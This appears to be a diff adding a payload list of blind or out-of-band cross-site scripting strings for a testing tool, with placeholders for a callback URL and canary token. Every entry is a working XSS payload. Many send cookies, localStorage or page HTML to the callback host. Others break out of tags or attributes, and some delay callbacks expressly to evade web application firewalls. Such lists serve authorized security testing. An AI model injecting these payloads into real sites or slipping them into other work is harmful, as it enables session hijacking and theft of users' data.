@@ -1,0 +1,63 @@
+# Blind/OOB XSS Payloads
+# {{CALLBACK}} = callback URL, {{CANARY}} = unique token
+
+# === Image-Based Callbacks ===
+<img src="{{CALLBACK}}/c/{{CANARY}}">
+<img src=x onerror="new Image().src='{{CALLBACK}}/c/{{CANARY}}'">
+<img src=x onerror="(new Image).src='{{CALLBACK}}/c/{{CANARY}}?c='+document.cookie">
+
+# === Fetch-Based Callbacks ===
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}')</script>
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}?c='+document.cookie)</script>
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}?d='+document.domain)</script>
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}',{method:'POST',body:document.cookie})</script>
+
+# === XMLHttpRequest Callbacks ===
+<script>var x=new XMLHttpRequest();x.open('GET','{{CALLBACK}}/c/{{CANARY}}');x.send()</script>
+<script>var x=new XMLHttpRequest();x.open('GET','{{CALLBACK}}/c/{{CANARY}}?c='+document.cookie);x.send()</script>
+
+# === New Image Callbacks ===
+<script>new Image().src='{{CALLBACK}}/c/{{CANARY}}'</script>
+<script>new Image().src='{{CALLBACK}}/c/{{CANARY}}?c='+encodeURIComponent(document.cookie)</script>
+<script>new Image().src='{{CALLBACK}}/c/{{CANARY}}?u='+encodeURIComponent(location.href)</script>
+
+# === Event Handler Callbacks ===
+<svg onload="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<img src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<input onfocus="fetch('{{CALLBACK}}/c/{{CANARY}}')" autofocus>
+<details open ontoggle="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<body onload="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<marquee onstart="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<video src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+<audio src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+
+# === Tag-Breaking + Callbacks ===
+"><img src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+'><img src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+</script><script>fetch('{{CALLBACK}}/c/{{CANARY}}')</script>
+</textarea><img src=x onerror="fetch('{{CALLBACK}}/c/{{CANARY}}')">
+</title><script>fetch('{{CALLBACK}}/c/{{CANARY}}')</script>
+
+# === Attribute Injection + Callbacks ===
+" onfocus="fetch('{{CALLBACK}}/c/{{CANARY}}')" autofocus x="
+' onfocus='fetch("{{CALLBACK}}/c/{{CANARY}}")' autofocus x='
+" onmouseover="fetch('{{CALLBACK}}/c/{{CANARY}}')" x="
+
+# === Data Exfiltration Variants ===
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}?c='+document.cookie)</script>
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}?l='+btoa(document.body.innerHTML.substring(0,500)))</script>
+<script>fetch('{{CALLBACK}}/c/{{CANARY}}?ls='+btoa(JSON.stringify(localStorage)))</script>
+
+# === WebSocket Callback ===
+<script>new WebSocket('ws://'+location.host).onerror=function(){fetch('{{CALLBACK}}/c/{{CANARY}}')}</script>
+
+# === Navigator.sendBeacon ===
+<script>navigator.sendBeacon('{{CALLBACK}}/c/{{CANARY}}',document.cookie)</script>
+
+# === CSS-Based Exfiltration ===
+<style>@import url('{{CALLBACK}}/c/{{CANARY}}')</style>
+<link rel=stylesheet href='{{CALLBACK}}/c/{{CANARY}}'>
+
+# === Delayed Callbacks (evade WAFs that check immediate requests) ===
+<script>setTimeout(function(){fetch('{{CALLBACK}}/c/{{CANARY}}')},3000)</script>
+<script>requestAnimationFrame(function(){fetch('{{CALLBACK}}/c/{{CANARY}}')})</script>
